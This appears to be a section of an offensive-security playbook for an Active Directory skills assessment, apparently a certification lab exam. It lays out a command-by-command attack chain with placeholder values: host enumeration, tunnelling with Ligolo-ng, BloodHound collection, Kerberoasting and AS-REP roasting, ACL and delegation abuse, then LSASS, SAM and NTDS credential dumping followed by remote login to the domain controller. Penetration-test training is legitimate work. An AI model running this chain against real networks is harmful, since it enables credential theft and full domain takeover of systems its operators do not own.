## Part 2: AD Skills Assessment Part 2 Playbook & Checklist

When executing **AD Skills Assessment Part 2** (which starts from an initial foothold or web/RDP entry point and chains internal AD enumeration, privilege escalation, ACL/delegation/certificate or trust abuse to compromise the target domain), follow this structured execution sequence:

### Step 1: Entry Host Foothold & Local Enumeration

```powershell
# Confirm current identity, token privileges, and network interfaces
whoami /all
ipconfig /all
route print
netstat -ano
```

- Sweep for local credentials, PowerShell transcripts/history, scheduled tasks, web root configs (`C:\inetpub\wwwroot\`), and saved credentials (`cmdkey /list`).
- If landing on a Linux or DMZ host first, establish a [Ligolo-ng](/pivoting/ligolo) tunnel into the internal AD subnet and point `/etc/hosts` at the internal Domain Controller.

### Step 2: Domain Discovery & BloodHound Collection

```bash
# From Kali through the tunnel:
nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD'
nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --users --groups --pass-pol
bloodhound-ce-python -d DOMAIN_FQDN -u USER -p 'PASSWORD' -ns DC_IP -c All --zip --dns-tcp
```

```powershell
# Or from a domain-joined Windows shell:
.\SharpHound.exe -c All --zipfilename ad-part2.zip
```

### Step 3: Systematic AD Escalation Triage

Check each of these five core AD attack primitives against your current identity and groups:

1. **Readable Shares & SYSVOL Scripts:**
   - `nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD' -M spider_plus`
2. **Kerberoasting & AS-REP Roasting:**
   - `impacket-GetUserSPNs 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile part2-kerb.hash`
   - `impacket-GetNPUsers 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -format hashcat -outputfile part2-asrep.hash`
3. **Outbound Object Control (ACL Abuse Chain):**
   - In BloodHound, check **Transitive Object Control** from your owned principals, or run:

```bash
bloodyAD --host DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
```

   - Follow the exact ACL primitive in [ACL Abuse Quick Reference](/active-directory/acl-abuse) (`ForceChangePassword`, `AddMember`, `GenericWrite` SPN/Shadow Credentials, `WriteDACL`, `ReadGMSAPassword`).
4. **Kerberos Delegation & Coercion:**
   - Check for computers/users with **Unconstrained Delegation** (`trustedforauth`) or **Constrained / RBCD Delegation** ([Kerberos Delegation Quick Reference](/active-directory/delegation)).
5. **DomainController / Admin Session Compromise:**
   - Once an account with local admin on a member server or DC is compromised, dump LSASS / SAM / NTDS (`impacket-secretsdump`) and authenticate to the DC via `evil-winrm` or `impacket-psexec` to retrieve the final assessment flags.
